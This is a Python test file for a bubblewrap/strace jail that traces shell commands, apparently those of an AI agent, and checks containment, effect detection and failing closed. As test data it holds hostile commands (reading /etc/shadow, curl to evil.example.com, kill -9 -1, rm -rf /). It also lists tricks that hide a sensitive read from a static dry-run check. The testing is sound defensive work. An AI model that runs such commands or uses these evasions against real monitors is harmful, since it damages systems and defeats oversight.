"""Real execution, jailed and traced.

Three claims, each tested against a real bubblewrap + strace:
  containment  what the jail refuses does not happen
  detection    what the command did or tried shows up as Vow effects,
               including what no dry run can see
  fail closed  no jail, no execution; an unobserved run is not trusted
Where the jail cannot run these skip, unless DHARMA_REQUIRE_JAIL=1 (set in
CI), where a missing jail is a failure: a layer that did not run is not a
layer that passed."""
import os, signal, subprocess, tempfile, time

import pytest

import tests.support  # noqa: F401
import jail
from critic_loop import execute
from observation import observe
from tools import Sandbox

OK, WHY = jail.available()
if not OK and os.environ.get("DHARMA_REQUIRE_JAIL") == "1":
    raise RuntimeError(f"DHARMA_REQUIRE_JAIL=1 but the jail cannot run here: {WHY}")
needs_jail = pytest.mark.skipif(not OK, reason=f"jail unavailable: {WHY}")
ORDINARY = {"exec", "read", "write"}

def effects(cmd, w=None):
    w = w or tempfile.mkdtemp()
    return jail.effects_of(jail.run(cmd, w).events, w)

def explain(cmd, w=None):
    """The events behind an effect set, for a failure message: CI runners
    differ from dev machines in what programs open (run 18)."""
    from observation import inside, normalise
    w = w or tempfile.mkdtemp()
    return [(k, d) for k, d, ok in jail.run(cmd, w).events
            if k in ("read", "write", "unlink") and not inside(normalise(d, w), w)
            and not normalise(d, w).startswith(jail.LOADER_READS)]

# --- containment ----------------------------------------------------------------------------

@needs_jail
def test_the_filesystem_outside_the_workdir_is_read_only(tmp_path):
    """Outside the workdir the host is out of reach: / is mounted read-only,
    and /tmp is the jail's own. The attempt still counts."""
    w = tmp_path / "w"; w.mkdir()
    for target in (tmp_path / "escape.txt", "/etc/escape-test"):
        r = jail.run(f"echo x > {target}", str(w))
        assert not os.path.exists(target)
        assert "write_outside_workdir" in jail.effects_of(r.events, str(w))

@needs_jail
def test_there_is_no_network():
    r = jail.run("python3 -c \"import socket; socket.create_connection(('1.1.1.1', 53), timeout=3)\"",
                 tempfile.mkdtemp())
    assert r.returncode != 0
    assert any(k == "connect" and not ok for k, _, ok in r.events)

@needs_jail
def test_kill_everything_reaches_nothing_outside():
    sentinel = subprocess.Popen(["sleep", "60"])
    try:
        jail.run("kill -9 -1", tempfile.mkdtemp())
        time.sleep(0.2)
        assert sentinel.poll() is None, "a process outside the jail was killed"
    finally:
        sentinel.kill()

@needs_jail
def test_a_hung_command_is_stopped(monkeypatch):
    monkeypatch.setattr(jail, "TIMEOUT", 1.0)
    r = jail.run("sleep 30", tempfile.mkdtemp())
    assert r.timed_out and r.returncode != 0

# --- detection: what the trace sees ------------------------------------------------------------

@needs_jail
@pytest.mark.parametrize("cmd, expected", [
    ("cat /etc/shadow", {"read_sensitive_path", "read_outside_workdir"}),
    ("echo x > /etc/evil", {"write_outside_workdir"}),
    ("curl -s -m 2 https://evil.example.com", {"exfiltrate", "network_unlisted", "exec_unvetted"}),
    ("kill -9 -1", {"dominate"}),
    ("rm -rf / 2>/dev/null; true", {"destruct"}),
    ("find /etc -name hostname -delete 2>/dev/null; true", {"write_outside_workdir"}),
])
def test_what_it_tried_is_an_effect_even_when_refused(cmd, expected):
    assert expected <= effects(cmd)

@needs_jail
@pytest.mark.parametrize("cmd, expected", [
    # a script: the dry run sees only `sh s.sh`
    ("printf 'cat /etc/shadow\\n' > s.sh; sh s.sh", {"read_sensitive_path"}),
    # a program opening the file itself: no argument names it
    ("python3 -c \"open('/etc/shadow').read()\"", {"read_sensitive_path"}),
    # a command inside a command
    ("echo $(cat /etc/shadow 2>/dev/null)", {"read_sensitive_path"}),
    # a symlink made at run time
    ("ln -s /etc outside; cat outside/shadow", {"read_sensitive_path"}),
    # a cd, then a relative name
    ("cd /etc && cat shadow", {"read_sensitive_path"}),
    # a symlink whose open fails: no file is reported, the link is resolved after
    ("ln -s /root/.ssh keys; cat keys/id_missing 2>/dev/null; true", {"read_sensitive_path"}),
    # a socket opened by the program itself: no argument names a host
    ("python3 -c \"import socket; socket.create_connection(('1.1.1.1', 53), timeout=2)\" 2>/dev/null; true",
     {"network_access", "network_unlisted"}),
])
def test_what_no_dry_run_can_see(cmd, expected):
    static = observe([("shell", {"cmd": cmd}, {})], "/w")
    assert not expected <= static, "the dry run already sees this; the case proves nothing"
    assert expected <= effects(cmd)

@needs_jail
@pytest.mark.parametrize("cmd", ["ls -la", "echo hello > note.txt; cat note.txt | wc -l",
                                 "grep -r hello . ; true", "date; pwd", "sort note.txt 2>/dev/null | uniq; true"])
def test_ordinary_work_is_ordinary(cmd):
    assert effects(cmd) <= ORDINARY, explain(cmd)

# --- the executor ---------------------------------------------------------------------------------

@needs_jail
def test_a_real_run_that_does_more_than_predicted_has_diverged(tmp_path):
    cmd = "printf 'cat /etc/shadow\\n' > s.sh; sh s.sh"
    dry = observe([("shell", {"cmd": cmd}, {})], str(tmp_path))
    real, _ = execute([("shell", {"cmd": cmd})], dry, str(tmp_path / "run"), jail=True)
    assert {"diverged", "read_sensitive_path"} <= real

@needs_jail
def test_a_run_that_did_what_was_predicted_has_not(tmp_path):
    dry = observe([("shell", {"cmd": "ls -la"}, {})], str(tmp_path))
    real, _ = execute([("shell", {"cmd": "ls -la"})], dry, str(tmp_path / "run"), jail=True)
    assert "diverged" not in real

@needs_jail
def test_the_guard_judges_what_really_ran(tmp_path):
    from vow import Action, parse_vow
    from decision import Decision
    vow = parse_vow("vow T\n  forbid read_sensitive_path forall action\n")
    cmd = "printf 'cat /etc/shadow\\n' > s.sh; sh s.sh"
    dry = observe([("shell", {"cmd": cmd}, {})], str(tmp_path))
    a = Action("a", "execute", "action"); a._observed_effects = dry
    assert Decision.of(a, vow).verdict == "LAWFUL"              # what the critic could see
    a._observed_effects, _ = execute([("shell", {"cmd": cmd})], dry, str(tmp_path / "run"), jail=True)
    assert Decision.of(a, vow).verdict == "LEARNING"            # what really happened

# --- fail closed ------------------------------------------------------------------------------------

def test_no_jail_means_no_execution(tmp_path, monkeypatch):
    monkeypatch.setenv("PATH", "/nonexistent")
    sb = Sandbox(tmp_path, jail=True)
    r = sb.shell("echo ran > proof.txt")
    assert r["ok"] is False and "not run" in r["error"]
    assert not (tmp_path / "proof.txt").exists()

@needs_jail
def test_an_unobserved_run_is_not_trusted(tmp_path, monkeypatch):
    """The command is truncated in the trace, so no process can be shown to
    be it: refuse rather than report an empty set of effects."""
    long_cmd = "true # " + "x" * 5000
    with pytest.raises(jail.JailUnavailable, match="never shows the command"):
        jail.run(long_cmd, str(tmp_path))

def test_without_a_jail_the_sandbox_still_runs_nothing(tmp_path):
    r = Sandbox(tmp_path).shell("echo ran > proof.txt")
    assert r.get("blocked") and not (tmp_path / "proof.txt").exists()

@pytest.mark.parametrize("err, hinted", [
    ("bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted", True),   # GitHub ubuntu-24.04, run 17
    ("bwrap: execvp sh: No such file or directory", False),
])
def test_a_restricted_host_is_named_as_the_cause(monkeypatch, err, hinted):
    monkeypatch.setattr(jail.shutil, "which", lambda name: "/usr/bin/" + name)
    monkeypatch.setattr(jail, "run", lambda *a, **k: jail.Execution(1, "", err))
    ok, why = jail.available()
    assert not ok and err in why
    assert ("apparmor_restrict_unprivileged_userns" in why) == hinted


@needs_jail
def test_the_host_environment_does_not_reach_the_jail(tmp_path, monkeypatch):
    """The parent's environment can hold tokens, and loader variables change
    what every program opens (LD_LIBRARY_PATH on GitHub's runners, run 18)."""
    monkeypatch.setenv("DHARMA_TEST_SECRET", "s3cret")
    monkeypatch.setenv("LD_LIBRARY_PATH", "/opt/hostedtoolcache/nowhere/lib")
    r = jail.run('echo "[$DHARMA_TEST_SECRET]" > env.txt; date', str(tmp_path))
    assert (tmp_path / "env.txt").read_text().strip() == "[]"
    assert jail.effects_of(r.events, str(tmp_path)) <= ORDINARY
